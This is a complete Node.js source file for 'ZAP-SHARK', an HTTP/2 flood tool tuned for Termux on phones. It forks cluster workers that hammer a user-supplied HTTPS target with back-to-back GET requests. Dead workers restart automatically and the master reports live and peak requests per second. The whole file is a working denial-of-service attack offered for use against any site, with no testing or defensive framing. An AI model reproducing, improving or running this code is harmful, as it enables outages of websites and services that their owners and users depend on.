const http2 = require('http2');
const os = require('os');
const { exec } = require('child_process');
const cluster = require('cluster');
const numCPUs = os.cpus().length;

class ZAPSHARK {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.status = "ATTACKING";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.peakRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        
        // Performance tuning - optimized for Termux/mobile
        this.concurrency = Math.max(1, Math.min(numCPUs, 2)); // Conservative for mobile
        this.workers = [];
        
        // Maintenance
        this.lastMaintenance = Date.now();
        this.maintenanceInterval = 3600000;
        this.maintenanceDuration = 600000;
        
        this.statsInterval = null;
    }

    // Ultra-fast request function
    createAttackWorker() {
        if (cluster.isWorker) {
            const client = http2.connect(process.env.TARGET_URL, {
                maxSessionMemory: 8192,  // Reduced for mobile
                maxDeflateDynamicTableSize: 2048,
                peerMaxConcurrentStreams: 100
            });

            let requests = 0;
            const reportInterval = setInterval(() => {
                if (process.connected) {
                    process.send({ requests });
                    requests = 0;
                }
            }, 500);

            client.on('connect', () => {
                const attack = () => {
                    try {
                        const req = client.request({ 
                            ':method': 'GET', 
                            ':path': '/',
                            'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36'
                        });
                        
                        req.on('response', () => {
                            req.destroy();
                            requests++;
                        });
                        
                        req.on('error', () => {
                            requests++;
                            req.destroy();
                        });
                        
                        req.on('close', () => {
                            // Immediate next request
                            setImmediate(attack);
                        });
                        
                        req.end();
                        
                    } catch (err) {
                        requests++;
                        setImmediate(attack);
                    }
                };
                
                // Start attack loop
                attack();
            });

            client.on('error', () => {
                // Silent reconnect
                setTimeout(() => process.exit(1), 500);
            });

            process.on('disconnect', () => {
                clearInterval(reportInterval);
                try { client.destroy(); } catch(e) {}
                process.exit(0);
            });
        }
    }

    // Master process control
    startMaster() {
        console.log(`🚀 ZAP-SHARK BOOTING...`);
        console.log(`🎯 Target: ${this.targetUrl}`);
        console.log(`⚡ Workers: ${this.concurrency}`);
        console.log(`💻 CPU Cores: ${numCPUs}`);
        console.log(`📱 Optimized: Termux/Mobile`);
        console.log('='.repeat(50));

        // Fork workers
        for (let i = 0; i < this.concurrency; i++) {
            const worker = cluster.fork({
                TARGET_URL: this.targetUrl
            });
            
            worker.on('message', (msg) => {
                this.totalRequests += msg.requests;
                this.requestsSinceLastCalc += msg.requests;
            });
            
            worker.on('exit', (code, signal) => {
                // Auto-restart worker
                setTimeout(() => {
                    if (this.running) {
                        cluster.fork({ TARGET_URL: this.targetUrl });
                    }
                }, 100);
            });
        }

        this.startStats();
        this.startMaintenanceCycle();
        this.setupControls();
    }

    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.5) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.peakRPS = Math.max(this.peakRPS, this.currentRPS);
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    formatRuntime() {
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const hours = Math.floor(runtime / 3600);
        const minutes = Math.floor((runtime % 3600) / 60);
        const seconds = runtime % 60;
        return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }

    updateDisplay() {
        this.calculateRPS();
        
        const memory = process.memoryUsage();
        const memUsage = (memory.heapUsed / 1024 / 1024).toFixed(1);
        const activeWorkers = Object.keys(cluster.workers || {}).length;
        
        process.stdout.write(`\r🦈 ZAP-SHARK: [${this.formatRuntime()}] | ${this.status} | ` +
                           `REQS: ${this.totalRequests.toLocaleString()} | ` +
                           `RPS: ${this.currentRPS.toFixed(0)}/s | ` +
                           `PEAK: ${this.peakRPS.toFixed(0)}/s | ` +
                           `MEM: ${memUsage}MB | ` +
                           `WORKERS: ${activeWorkers}/${this.concurrency}`);
    }

    flushDNS() {
        // Termux-compatible DNS flush
        exec('pkill -HUP dnsmasq 2>/dev/null || pkill -HUP systemd-resolve 2>/dev/null', () => {});
    }

    flushSockets() {
        // Restart workers for clean sockets
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
    }

    startMaintenanceCycle() {
        setInterval(() => {
            this.checkMaintenance();
        }, 5000);
    }

    checkMaintenance() {
        const currentTime = Date.now();
        const timeSinceLastMaintenance = currentTime - this.lastMaintenance;
        
        if (timeSinceLastMaintenance >= this.maintenanceInterval && this.status === "ATTACKING") {
            console.log('\n\n🔧 MAINTENANCE MODE ACTIVATED (10 minutes)');
            this.status = "PAUSED";
            
            this.flushDNS();
            this.flushSockets();
            
            setTimeout(() => {
                this.status = "ATTACKING";
                this.lastMaintenance = Date.now();
                console.log('⚡ MAINTENANCE COMPLETE - MAX POWER RESTORED');
            }, this.maintenanceDuration);
        }
    }

    startStats() {
        this.statsInterval = setInterval(() => {
            this.updateDisplay();
        }, 100);
    }

    setupControls() {
        // Keyboard controls for Termux
        if (process.stdin.isTTY) {
            process.stdin.setRawMode(true);
            process.stdin.resume();
            process.stdin.setEncoding('utf8');
            
            process.stdin.on('data', (key) => {
                // Ctrl+C or 'q' to quit
                if (key === '\u0003' || key === 'q') {
                    this.stop();
                }
                // 'p' to pause/resume
                if (key === 'p') {
                    this.status = this.status === "ATTACKING" ? "PAUSED" : "ATTACKING";
                    console.log(`\n\n⏸️  STATUS: ${this.status}`);
                }
                // 'r' to restart workers
                if (key === 'r') {
                    console.log('\n\n🔄 RESTARTING WORKERS...');
                    this.flushSockets();
                }
            });
        }
    }

    async start() {
        if (cluster.isMaster) {
            this.startMaster();
        } else {
            this.createAttackWorker();
        }
    }

    stop() {
        console.log('\n\n🛑 SHUTTING DOWN ZAP-SHARK...');
        this.running = false;
        
        if (this.statsInterval) {
            clearInterval(this.statsInterval);
        }
        
        // Kill all workers
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        
        setTimeout(() => {
            console.log(`📊 FINAL STATS:`);
            console.log(`   Total Requests: ${this.totalRequests.toLocaleString()}`);
            console.log(`   Peak RPS: ${this.peakRPS.toFixed(0)}/s`);
            console.log(`   Runtime: ${this.formatRuntime()}`);
            console.log('🎯 ZAP-SHARK TERMINATED');
            process.exit(0);
        }, 500);
    }
}

// Performance optimizations for Termux
process.env.UV_THREADPOOL_SIZE = Math.min(128, os.cpus().length * 4);

const target = process.argv[2];
if (!target) {
    console.log('❌ ERROR: Please provide target URL');
    console.log('💡 Usage: node shark.js https://target.com');
    process.exit(1);
}

if (!target.startsWith('https://')) {
    console.log('❌ ERROR: Use HTTPS target for HTTP/2');
    process.exit(1);
}

const shark = new ZAPSHARK(target);
shark.start().catch(err => {
    console.log('Startup error:', err.message);
});
